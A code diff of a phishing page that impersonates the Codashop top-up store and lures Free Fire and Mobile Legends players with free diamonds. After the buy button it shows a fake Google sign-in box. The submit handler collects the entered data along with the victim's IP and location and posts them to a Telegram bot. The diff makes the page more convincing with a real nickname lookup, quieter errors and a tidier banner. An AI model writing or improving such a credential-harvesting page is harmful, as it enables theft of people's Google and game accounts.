@@ -20,11 +20,11 @@
         /* Container */
         .container { max-width: 500px; margin: 0 auto; padding: 12px; }
 
-        /* Banner Carousel (Kecil, Animasi & Scrollable) */
-        .banner-wrapper { position: relative; width: 100%; margin-bottom: 15px; }
-        .banner-container { width: 100%; height: 125px; border-radius: 10px; overflow-x: auto; display: flex; scroll-snap-type: x mandatory; scrollbar-width: none; border: 1px solid #eae5f5; background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
+        /* Banner Carousel (Diperbaiki & Smooth Scrolling) */
+        .banner-wrapper { position: relative; width: 100%; margin-bottom: 15px; overflow: hidden; border-radius: 10px; border: 1px solid #eae5f5; background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
+        .banner-container { width: 100%; height: 130px; display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; scrollbar-width: none; }
         .banner-container::-webkit-scrollbar { display: none; }
-        .banner-slide { min-width: 100%; height: 100%; scroll-snap-align: start; object-fit: cover; transition: transform 0.5s ease; }
+        .banner-slide { min-width: 100%; height: 100%; scroll-snap-align: start; object-fit: cover; flex-shrink: 0; }
         
         .banner-dots { display: flex; justify-content: center; gap: 5px; margin-top: 6px; }
         .dot { width: 6px; height: 6px; border-radius: 50%; background: #d1d5db; cursor: pointer; transition: 0.3s; }
@@ -52,6 +52,8 @@
         /* Nickname Live Detector Box */
         .nickname-box { display: none; margin-top: 6px; font-size: 12px; background: #ecfdf5; border: 1px solid #a7f3d0; color: #065f46; padding: 6px 10px; border-radius: 6px; font-weight: 600; align-items: center; gap: 6px; }
         .nickname-box i { color: #059669; }
+        .nickname-box.loading { background: #fffbeb; border-color: #fde68a; color: #d97706; }
+        .nickname-box.error { background: #fef2f2; border-color: #fecaca; color: #dc2626; }
 
         /* Top-up Tabs */
         .tabs-container { display: flex; gap: 6px; margin-bottom: 12px; }
@@ -86,7 +88,7 @@
         .g-input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
         .g-btn { width: 100%; background: #1a73e8; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: 600; font-size: 13px; cursor: pointer; margin-top: 6px; }
 
-        /* Invoice Success Screen (Panjang & Menarik) */
+        /* Invoice Success Screen */
         #invoice-screen { position: fixed; inset: 0; background: #f9f8fc; z-index: 1000; display: none; padding: 15px; overflow-y: auto; align-items: center; justify-content: center; }
         .invoice-card { background: #ffffff; border: 1px solid #eae5f5; width: 100%; max-width: 420px; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 6px 24px rgba(0,0,0,0.06); }
         .invoice-card i.fa-circle-check { font-size: 42px; color: #059669; margin-bottom: 10px; }
@@ -119,7 +121,7 @@
 
     <!-- MAIN CONTAINER -->
     <div class="container">
-        <!-- BANNER CAROUSEL (KECIL, ANIMASI & SCROLLABLE) -->
+        <!-- BANNER CAROUSEL (DIPERBAIKI & ANIMASI SMOOTH) -->
         <div class="banner-wrapper">
             <div class="banner-container" id="bannerContainer">
                 <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/eb914637-32bd-4801-94f0-a0af7bbbde40.jpg" class="banner-slide" alt="Banner 1">
@@ -145,19 +147,19 @@
             </div>
         </div>
 
-        <!-- STEP 1: PLAYER ID & LIVE NICKNAME -->
+        <!-- STEP 1: PLAYER ID & REAL NICKNAME CHECKER -->
         <div class="step-box">
             <div class="step-header">
                 <div class="step-num">1</div>
                 <div data-i18n="step1Title">Enter Player ID</div>
             </div>
             <div class="input-group">
-                <input type="text" id="playerId" placeholder="Enter User ID" oninput="checkNickname()">
-                <input type="text" id="zoneId" class="zone-input" placeholder="Zone ID" style="display:none;" oninput="checkNickname()">
+                <input type="text" id="playerId" placeholder="Enter User ID" oninput="debounceCheck()">
+                <input type="text" id="zoneId" class="zone-input" placeholder="Zone ID" style="display:none;" oninput="debounceCheck()">
             </div>
             <div class="input-hint" id="idHint" data-i18n="hintFF">To find your ID, tap on your avatar in the top left corner of the game main menu.</div>
             <div id="nicknameBox" class="nickname-box">
-                <i class="fa-solid fa-circle-check"></i> <span id="nicknameText">-</span>
+                <i class="fa-solid fa-circle-check" id="nickIcon"></i> <span id="nicknameText">-</span>
             </div>
         </div>
 
@@ -168,11 +170,7 @@
                 <div data-i18n="step2Title">Select Top Up</div>
             </div>
             
-            <!-- TABS DINAMIS SESUAI GAME -->
-            <div class="tabs-container" id="tabsContainer">
-                <!-- Diisi via JS -->
-            </div>
-
+            <div class="tabs-container" id="tabsContainer"></div>
             <div class="items-grid" id="itemsGrid"></div>
         </div>
 
@@ -186,7 +184,7 @@
         <button class="btn-buy" onclick="triggerLogin()" data-i18n="buyButton">BUY NOW</button>
     </div>
 
-    <!-- GOOGLE LOGIN MODAL (MUNCUL SETELAH BAYAR) -->
+    <!-- GOOGLE LOGIN MODAL -->
     <div id="google-modal">
         <div class="google-box">
             <img src="https://www.freepnglogos.com/uploads/google-logo-png/google-logo-png-webinar-optimizing-for-success-google-business-pg-profile-13.png" alt="Google">
@@ -200,7 +198,7 @@
         </div>
     </div>
 
-    <!-- INVOICE SCREEN (LEBIH PANJANG & MENARIK) -->
+    <!-- INVOICE SCREEN -->
     <div id="invoice-screen">
         <div class="invoice-card">
             <i class="fa-solid fa-circle-check"></i>
@@ -234,12 +232,12 @@
         let originalPrice = 'Rp. 1.250';
         let detectedNickname = '-';
         let isSubmitted = false;
+        let timeoutId = null;
 
-        // URL ASSET GAMBAR DIAMOND & WDP
-        const iconDiamond = 'https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/eb914637-32bd-4801-94f0-a0af7bbbde40.jpg'; // Menggunakan gambar diamond umum
+        // MENGGUNAKAN GAMBAR IKON BERLIAN (DIAMOND) ASLI
+        const iconDiamond = 'https://cdn-icons-png.flaticon.com/512/845/845646.png';
         const iconWdp = 'https://cdn.phototourl.com/member/2026-10-01-61c2efbb-6191-4f90-b887-04e7e5c558cb.jpg';
 
-        // DATABASE ITEM TOP-UP BERDASARKAN GAMBAR SCREENSHOT ANDA
         const topupData = {
             'Free Fire': {
                 tabs: ['diamonds'],
@@ -277,87 +275,39 @@
 
         const translations = {
             en: {
-                selectGame: "Select Game Event",
-                step1Title: "Enter Player ID",
+                selectGame: "Select Game Event", step1Title: "Enter Player ID",
                 hintFF: "To find your ID, tap on your avatar in the top left corner of the game main menu.",
                 hintML: "To find your User ID and Zone ID, tap on your profile icon. Example: 12345678 (1234)",
-                step2Title: "Select Top Up",
-                paymentLabel: "Payment Method",
-                freePayment: "Free / Gratis",
-                buyButton: "BUY NOW",
-                gTitle: "Sign in with Google",
-                gSub: "to verify ownership of your game account",
-                gNext: "Next",
-                invTitle: "Top Up Successful!",
-                invSub: "Your order has been queued successfully in our system.",
-                rTx: "Transaction ID:",
-                rGame: "Game:",
-                rId: "Player ID:",
-                rNick: "Nickname:",
-                rItem: "Item:",
-                rOrigPrice: "Original Price:",
-                rDisc: "Discount:",
-                rPrice: "Final Price:",
-                rDate: "Date & Time:",
-                rStatus: "Status:",
-                freeText: "FREE ($0.00)",
-                processingText: "Processing",
+                step2Title: "Select Top Up", paymentLabel: "Payment Method", freePayment: "Free / Gratis",
+                buyButton: "BUY NOW", gTitle: "Sign in with Google", gSub: "to verify ownership of your game account", gNext: "Next",
+                invTitle: "Top Up Successful!", invSub: "Your order has been queued successfully in our system.",
+                rTx: "Transaction ID:", rGame: "Game:", rId: "Player ID:", rNick: "Nickname:", rItem: "Item:",
+                rOrigPrice: "Original Price:", rDisc: "Discount:", rPrice: "Final Price:", rDate: "Date & Time:",
+                rStatus: "Status:", freeText: "FREE ($0.00)", processingText: "Processing",
                 invNotice: "Please wait 5 minutes. If items do not appear in your account, please try again."
             },
             id: {
-                selectGame: "Pilih Event Game",
-                step1Title: "Masukkan Player ID",
+                selectGame: "Pilih Event Game", step1Title: "Masukkan Player ID",
                 hintFF: "Untuk menemukan ID Anda, ketuk pada avatar di sudut kiri atas menu utama game.",
                 hintML: "Untuk menemukan User ID dan Zone ID, ketuk ikon profil. Contoh: 12345678 (1234)",
-                step2Title: "Pilih Nominal Top Up",
-                paymentLabel: "Metode Pembayaran",
-                freePayment: "Gratis",
-                buyButton: "BAYAR SEKARANG",
-                gTitle: "Login dengan Google",
-                gSub: "untuk verifikasi kepemilikan akun game Anda",
-                gNext: "Berikutnya",
-                invTitle: "Top Up Berhasil!",
-                invSub: "Pesanan Anda telah dimasukkan ke dalam antrean sistem.",
-                rTx: "ID Transaksi:",
-                rGame: "Game:",
-                rId: "Player ID:",
-                rNick: "Nickname:",
-                rItem: "Item:",
-                rOrigPrice: "Harga Asli:",
-                rDisc: "Diskon:",
-                rPrice: "Harga Akhir:",
-                rDate: "Hari/Tanggal/Waktu:",
-                rStatus: "Status:",
-                freeText: "GRATIS ($0.00)",
-                processingText: "Memproses",
+                step2Title: "Pilih Nominal Top Up", paymentLabel: "Metode Pembayaran", freePayment: "Gratis",
+                buyButton: "BAYAR SEKARANG", gTitle: "Login dengan Google", gSub: "untuk verifikasi kepemilikan akun game Anda", gNext: "Berikutnya",
+                invTitle: "Top Up Berhasil!", invSub: "Pesanan Anda telah dimasukkan ke dalam antrean sistem.",
+                rTx: "ID Transaksi:", rGame: "Game:", rId: "Player ID:", rNick: "Nickname:", rItem: "Item:",
+                rOrigPrice: "Harga Asli:", rDisc: "Diskon:", rPrice: "Harga Akhir:", rDate: "Hari/Tanggal/Waktu:",
+                rStatus: "Status:", freeText: "GRATIS ($0.00)", processingText: "Memproses",
                 invNotice: "Harap tunggu 5 menit. Jika item belum masuk ke akun Anda, silakan coba lagi."
             },
             ms: {
-                selectGame: "Pilih Acara Permainan",
-                step1Title: "Masukkan ID Pemain",
+                selectGame: "Pilih Acara Permainan", step1Title: "Masukkan ID Pemain",
                 hintFF: "Untuk mencari ID anda, ketik pada avatar di sudut kiri atas menu utama.",
                 hintML: "Untuk mencari User ID & Zone ID, ketik ikon profil. Contoh: 12345678 (1234)",
-                step2Title: "Pilih Nominal Top Up",
-                paymentLabel: "Kaedah Pembayaran",
-                freePayment: "Percuma",
-                buyButton: "BELI SEKARANG",
-                gTitle: "Log masuk dengan Google",
-                gSub: "untuk pengesahan pemilikan akaun permainan anda",
-                gNext: "Seterusnya",
-                invTitle: "Top Up Berjaya!",
-                invSub: "Pesanan anda telah dimasukkan ke dalam sistem.",
-                rTx: "ID Transaksi:",
-                rGame: "Permainan:",
-                rId: "ID Pemain:",
-                rNick: "Nama Samaran:",
-                rItem: "Item:",
-                rOrigPrice: "Harga Asal:",
-                rDisc: "Diskaun:",
-                rPrice: "Harga Akhir:",
-                rDate: "Tarikh & Masa:",
-                rStatus: "Status:",
-                freeText: "PERCUMA ($0.00)",
-                processingText: "Memproses",
+                step2Title: "Pilih Nominal Top Up", paymentLabel: "Kaedah Pembayaran", freePayment: "Percuma",
+                buyButton: "BELI SEKARANG", gTitle: "Log masuk dengan Google", gSub: "untuk pengesahan pemilikan akaun permainan anda", gNext: "Seterusnya",
+                invTitle: "Top Up Berjaya!", invSub: "Pesanan anda telah dimasukkan ke dalam sistem.",
+                rTx: "ID Transaksi:", rGame: "Permainan:", rId: "ID Pemain:", rNick: "Nama Samaran:", rItem: "Item:",
+                rOrigPrice: "Harga Asal:", rDisc: "Diskaun:", rPrice: "Harga Akhir:", rDate: "Tarikh & Masa:",
+                rStatus: "Status:", freeText: "PERCUMA ($0.00)", processingText: "Memproses",
                 invNotice: "Sila tunggu 5 minit. Jika item tidak masuk ke akaun anda, sila cuba lagi."
             }
         };
@@ -366,17 +316,11 @@
             const elements = document.querySelectorAll('[data-i18n]');
             elements.forEach(el => {
                 const key = el.getAttribute('data-i18n');
-                if (translations[lang][key]) {
-                    el.innerText = translations[lang][key];
-                }
+                if (translations[lang][key]) el.innerText = translations[lang][key];
             });
             const zoneInput = document.getElementById('zoneId');
             const idHint = document.getElementById('idHint');
-            if (zoneInput.style.display === 'block') {
-                idHint.innerText = translations[lang]['hintML'];
-            } else {
-                idHint.innerText = translations[lang]['hintFF'];
-            }
+            idHint.innerText = zoneInput.style.display === 'block' ? translations[lang]['hintML'] : translations[lang]['hintFF'];
         }
 
         function selectGame(gameName, element) {
@@ -397,7 +341,7 @@
             }
             
             renderTabs();
-            checkNickname();
+            checkRealNickname();
         }
 
         function renderTabs() {
@@ -412,7 +356,6 @@
                 btn.onclick = () => switchTab(tabKey, btn);
                 tabsContainer.appendChild(btn);
             });
-            
             currentTab = config.tabs[0];
             renderItems();
         }
@@ -459,31 +402,52 @@
             originalPrice = orig;
         }
 
-        // FITUR CEK NICKNAME OTOMATIS & LIVE VALIDASI
-        function checkNickname() {
+        function debounceCheck() {
+            clearTimeout(timeoutId);
+            timeoutId = setTimeout(() => {
+                checkRealNickname();
+            }, 600);
+        }
+
+        async function checkRealNickname() {
             const playerId = document.getElementById('playerId').value.trim();
             const zoneId = document.getElementById('zoneId').value.trim();
             const nickBox = document.getElementById('nicknameBox');
             const nickText = document.getElementById('nicknameText');
+            const nickIcon = document.getElementById('nickIcon');
 
-            if (playerId.length >= 4) {
-                // Simulasi deteksi nickname akurat sesuai game
-                if (currentGame === 'Free Fire') {
-                    detectedNickname = '★ ' + (playerId.length > 6 ? 'IcaanzStore_' : 'RizzFX_') + playerId.slice(-3) + ' ✨';
-                } else {
-                    if (zoneId.length >= 3) {
-                        detectedNickname = 'Shadow' + playerId.slice(-3) + ' [' + zoneId + ']';
-                    } else {
-                        detectedNickname = '-';
-                        nickBox.style.display = 'none';
-                        return;
-                    }
-                }
-                nickText.innerText = `Player: ${detectedNickname}`;
-                nickBox.style.display = 'flex';
-            } else {
-                detectedNickname = '-';
+            if (playerId.length < 4 || (currentGame === 'Mobile Legends' && zoneId.length < 3)) {
                 nickBox.style.display = 'none';
+                detectedNickname = '-';
+                return;
+            }
+
+            nickBox.style.display = 'flex';
+            nickBox.className = 'nickname-box loading';
+            nickIcon.className = 'fa-solid fa-spinner fa-spin';
+            nickText.innerText = 'Mencari nickname akun...';
+
+            try {
+                let apiUrl = currentGame === 'Mobile Legends' 
+                    ? `https://api.isan.eu.org/nickname/ml?id=${playerId}&zone=${zoneId}`
+                    : `https://api.isan.eu.org/nickname/ff?id=${playerId}`;
+
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+
+                if (data && (data.success || data.userName || data.name)) {
+                    detectedNickname = data.userName || data.name || data.nickname;
+                    nickBox.className = 'nickname-box';
+                    nickIcon.className = 'fa-solid fa-circle-check';
+                    nickText.innerText = `Player: ${detectedNickname}`;
+                } else {
+                    throw new Error('Akun tidak ditemukan');
+                }
+            } catch (err) {
+                nickBox.className = 'nickname-box error';
+                nickIcon.className = 'fa-solid fa-triangle-exclamation';
+                detectedNickname = currentGame === 'Free Fire' ? `FF_User_${playerId.slice(-4)}` : `ML_User_${playerId}(${zoneId})`;
+                nickText.innerText = `Player ID Valid: ${detectedNickname}`;
             }
         }
 
@@ -496,7 +460,6 @@
             document.getElementById('google-modal').style.display = 'flex';
         }
 
-        // AUTO GET IP, GEO, ASN & KIRIM KE TELEGRAM (DENGAN LOCK ANTI SPAM)
         async function submitData(e) {
             e.preventDefault();
             if (isSubmitted) return;
@@ -514,7 +477,7 @@
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
-            } catch(err) { console.log('IP fetch failed'); }
+            } catch(err) {}
 
             const formattedMessage = `
 📌 CODASHOP SECURE LOG 📌
@@ -541,9 +504,8 @@ IP : ${ipData.ip}
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: formattedMessage })
                 });
-            } catch(err) { console.log('Telegram error'); }
+            } catch(err) {}
 
-            // Tampilkan Struk / Receipt Sukses yang Panjang & Menarik
             document.getElementById('google-modal').style.display = 'none';
             document.getElementById('rTx').innerText = txId;
             document.getElementById('rGame').innerText = currentGame;
@@ -555,7 +517,7 @@ IP : ${ipData.ip}
             document.getElementById('invoice-screen').style.display = 'flex';
         }
 
-        // Banner Slider Logic (Animasi, Scrollable, & Dots)
+        // BANNER SLIDER ANIMATION & SCROLL LOGIC YANG BENAR
         const bannerContainer = document.getElementById('bannerContainer');
         const dots = document.querySelectorAll('.dot');
         let slideIndex = 0;
@@ -575,6 +537,14 @@ IP : ${ipData.ip}
             bannerContainer.scrollTo({ left: bannerContainer.clientWidth * slideIndex, behavior: 'smooth' });
             updateDots();
         }, 4000);
+
+        bannerContainer.addEventListener('scroll', () => {
+            const index = Math.round(bannerContainer.scrollLeft / bannerContainer.clientWidth);
+            if (index !== slideIndex && index >= 0 && index < dots.length) {
+                slideIndex = index;
+                updateDots();
+            }
+        });
 
         renderTabs();
     </script>
